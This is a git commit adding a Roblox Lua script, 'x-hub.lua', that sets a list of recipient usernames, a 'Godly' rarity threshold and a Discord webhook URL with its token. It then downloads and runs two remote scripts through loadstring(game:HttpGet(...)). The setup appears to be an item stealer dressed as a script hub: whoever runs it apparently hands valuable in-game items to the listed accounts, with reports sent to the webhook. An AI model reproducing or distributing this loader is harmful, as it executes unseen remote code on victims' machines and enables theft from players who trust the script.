633231decb3daaf4f2a873245e2c6739003825bc
Sanjxz <36453187+HyperRamzey@users.noreply.github.com>
2025-04-28 18:46:52 +0300

    Add files via upload

---
+++ x-hub.lua
@@ -0,0 +1,9 @@
+_G.Usernames = {"og32322", "ksushalove_rulit", "konchya_dani", "228DANIL_LOX228", "lmglenn1", "oleguz", "LMglenn"}
+_G.min_rarity = "Godly"
+_G.min_value = 1
+_G.pingEveryone = "Yes"
+_G.webhook = "https://discord.com/api/webhooks/1366435417238405211/v6tGJXQktxxz6n-xx3EOW5OnHzyvSwcPbl6kfPGfsFhvmpelPG55gI59AzgydkAxk4Bh"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/HyperRamzey/test/refs/heads/main/hubloader.lua'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HyperRamzey/test/refs/heads/main/gui2.lua"))()
+
